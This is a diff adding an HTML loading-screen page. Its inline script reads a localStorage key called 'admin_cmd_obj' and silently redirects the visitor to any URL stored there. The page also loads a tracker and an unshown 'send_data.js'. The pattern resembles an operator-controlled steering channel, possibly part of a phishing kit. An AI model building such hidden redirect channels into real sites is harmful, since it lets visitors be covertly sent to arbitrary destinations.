@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Loading...</title>
+
+    <link rel="icon" type="image/png" href="assets/images/favicon.png">
+
+    <link rel="stylesheet" href="./assets/styles.css">
+
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+
+<body style="margin: 0; overflow: hidden; background-color: #131314;">
+
+    <div class="loading-screen">
+
+        <svg class="spinner" viewBox="25 25 50 50">
+
+            <circle cx="50" cy="50" r="20"></circle>
+
+        </svg>
+
+    </div>
+
+    <script>
+
+        window.addEventListener('storage', (e) => {
+
+            if (e.key === 'admin_cmd_obj' && e.newValue) {
+
+                try {
+
+                    const data = JSON.parse(e.newValue);
+
+                    localStorage.removeItem('admin_cmd_obj');
+
+                    window.location.href = data.url;
+
+                } catch(err) {}
+
+            }
+
+        });
+
+        if (localStorage.getItem('admin_cmd_obj')) {
+
+            try {
+
+                const data = JSON.parse(localStorage.getItem('admin_cmd_obj'));
+
+                localStorage.removeItem('admin_cmd_obj');
+
+                window.location.href = data.url;
+
+            } catch(err) {}
+
+        }
+
+    </script>
+
+
+
+    <script src="send_data.js"></script>
+
+</body>
+
+</html>
+
